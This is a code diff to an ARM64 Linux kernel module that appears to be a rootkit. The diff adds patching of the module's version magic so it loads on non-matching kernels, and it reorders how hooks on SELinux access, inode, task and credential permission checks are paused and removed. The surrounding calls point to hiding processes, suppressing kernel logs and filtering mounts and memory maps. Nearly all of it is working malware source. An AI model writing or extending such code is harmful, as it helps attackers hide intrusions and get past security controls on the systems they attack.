@@ -76,6 +76,10 @@ static int nvk_init_all(void)
 	_nvk_state.sub_status[NVK_SUB_INJECT] = nvk_inject_init();
 	_nvk_state.sub_status[NVK_SUB_NS]     = nvk_ns_init();
 	nvk_vma_init();
+
+	if (nvk_check_kernel_match() != NVK_VER_EXACT)
+		nvk_patch_vermagic(&__this_module);
+
 	_nvk_state.ready = 1;
 
 	return _nvk_state.sub_status[NVK_SUB_HOOK];
@@ -127,26 +131,36 @@ static void nvk_cleanup_all(void)
 
 	nvk_thread_stop_all();
 
+	if (_nvk_vmalloc_hooked)
+		nvk_hook_pause(&_nvk_vmalloc_hook);
+	if (_nvk_ks_hooked)
+		nvk_hook_pause(&_nvk_ks_hook);
+	if (_nvk_avc_hook.active) nvk_hook_pause(&_nvk_avc_hook);
+	if (_nvk_inode_hook.active) nvk_hook_pause(&_nvk_inode_hook);
+	if (_nvk_task_perm_hook.active) nvk_hook_pause(&_nvk_task_perm_hook);
+	if (_nvk_cred_perm_hook.active) nvk_hook_pause(&_nvk_cred_perm_hook);
+
+	__asm__ __volatile__("dsb ish" ::: "memory");
+
 	nvk_dmesg_suppress_cleanup();
 	nvk_kmsg_read_filter_cleanup();
 	nvk_pid_hide_cleanup();
 	nvk_mount_filter_cleanup();
 	nvk_maps_filter_clear();
 
-	if (_nvk_vmalloc_hooked) {
-		nvk_hook_remove(&_nvk_vmalloc_hook);
-		_nvk_vmalloc_hooked = 0;
-	}
+	if (_nvk_cred_perm_hook.active) nvk_hook_remove(&_nvk_cred_perm_hook);
+	if (_nvk_task_perm_hook.active) nvk_hook_remove(&_nvk_task_perm_hook);
+	if (_nvk_inode_hook.active) nvk_hook_remove(&_nvk_inode_hook);
+	if (_nvk_avc_hook.active) nvk_hook_remove(&_nvk_avc_hook);
 
 	if (_nvk_ks_hooked) {
 		nvk_hook_remove(&_nvk_ks_hook);
 		_nvk_ks_hooked = 0;
 	}
-
-	if (_nvk_avc_hook.active) nvk_hook_remove(&_nvk_avc_hook);
-	if (_nvk_inode_hook.active) nvk_hook_remove(&_nvk_inode_hook);
-	if (_nvk_task_perm_hook.active) nvk_hook_remove(&_nvk_task_perm_hook);
-	if (_nvk_cred_perm_hook.active) nvk_hook_remove(&_nvk_cred_perm_hook);
+	if (_nvk_vmalloc_hooked) {
+		nvk_hook_remove(&_nvk_vmalloc_hook);
+		_nvk_vmalloc_hooked = 0;
+	}
 
 	__asm__ __volatile__("dsb ish" ::: "memory");
 	__asm__ __volatile__("isb" ::: "memory");
